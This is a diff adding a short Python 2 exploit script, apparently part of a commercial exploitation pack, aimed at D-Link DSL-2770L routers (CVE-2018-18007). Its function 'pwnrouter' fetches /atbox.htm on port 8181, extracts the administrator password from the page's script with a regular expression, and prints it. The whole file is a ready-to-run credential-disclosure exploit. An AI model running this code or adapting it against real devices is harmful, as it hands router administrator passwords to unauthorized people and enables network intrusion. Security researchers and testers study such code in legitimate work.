@@ -1,0 +1,42 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_link_24'
+_vendor_ = 'd-link'
+_model_  = ['DSL-2770L']
+_vuln_   = 'Credetendials Disclosure Vulnerability'
+_cve_    = 'CVE-2018-18007'
+_ref_    = 'https://seclists.org/fulldisclosure/2018/Dec/38'
+_port_   = 8181
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/atbox.htm' % (host,port)    
+    response = requests.get(url)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  m = re.search('if\\(ff\\.curpd\\.value != "([^"]+)"\\)', response.text)    
+  if m is not None:
+    print '[+] %s vulnerable\n' % host
+    print 'Admin password: %s'%m.group(1)        
+  else:            
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
